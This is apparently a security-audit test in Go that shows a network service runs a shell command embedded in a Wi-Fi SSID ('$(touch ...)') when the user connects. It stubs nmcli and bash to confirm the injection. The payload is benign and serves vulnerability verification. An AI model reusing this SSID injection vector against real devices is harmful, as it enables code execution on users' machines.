package network

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

func TestMain(m *testing.M) {
	if os.Getenv("AUDIT_STUB") == "1" {
		switch filepath.Base(os.Args[0]) {
		case "nmcli":
			if len(os.Args) > 1 && os.Args[1] == "-g" {
				fmt.Println(os.Getenv("AUDIT_SCAN_LINE"))
			}
			os.Exit(0)
		case "bash":
			if len(os.Args) > 2 && os.Args[1] == "-c" {
				_ = os.WriteFile(os.Getenv("AUDIT_BASH_LOG"), []byte(os.Args[2]), 0o600)
				_ = exec.Command("/bin/bash", "-c", os.Args[2]).Run()
			}
			os.Exit(0)
		}
	}
	os.Exit(m.Run())
}

func TestValidateSSIDInjectionFromScan(t *testing.T) {
	dir := t.TempDir()
	shortDir, err := os.MkdirTemp("/tmp", "asv-")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(shortDir)
	exe, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"nmcli", "bash"} {
		if err := os.Symlink(exe, filepath.Join(dir, name)); err != nil {
			t.Fatal(err)
		}
	}
	marker := filepath.Join(shortDir, "m")
	ssid := "$(touch " + marker + ")"
	if len(ssid) > 32 {
		t.Fatalf("SSID exceeds the 32-byte 802.11 limit: %d bytes", len(ssid))
	}
	scan := "no:87:5180:" + ssid + ":02\\:00\\:00\\:00\\:00\\:00:WPA2"

	t.Setenv("PATH", dir+":/usr/bin:/bin")
	t.Setenv("AUDIT_STUB", "1")
	t.Setenv("AUDIT_SCAN_LINE", scan)
	t.Setenv("AUDIT_BASH_LOG", filepath.Join(dir, "bash.log"))

	svc := NewService()

	nets := svc.listNetworks()
	found := false
	for _, n := range nets {
		if n.SSID == ssid {
			found = true
		}
	}
	if !found {
		t.Fatal("malicious SSID did not survive scan parsing; broadcast vector unreachable")
	}
	t.Logf("vector: broadcast SSID %q (%d bytes) survives nmcli -g parsing into the UI list", ssid, len(ssid))

	params, err := json.Marshal(map[string]string{"ssid": ssid, "password": "audit-placeholder"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := svc.connect(params); err != nil {
		t.Fatal(err)
	}

	log, err := os.ReadFile(filepath.Join(dir, "bash.log"))
	if err != nil {
		t.Fatal("bash -c was never invoked; no injection")
	}
	t.Logf("constructed shell string: %s", log)
	if _, err := os.Stat(marker); err != nil {
		t.Fatalf("command-injection marker was not created: %v", err)
	}
	t.Log("CONFIRMED: SSID command injection: a broadcast network name ran a shell command when the user connected with a password. Only nmcli and bash were stubs")
}
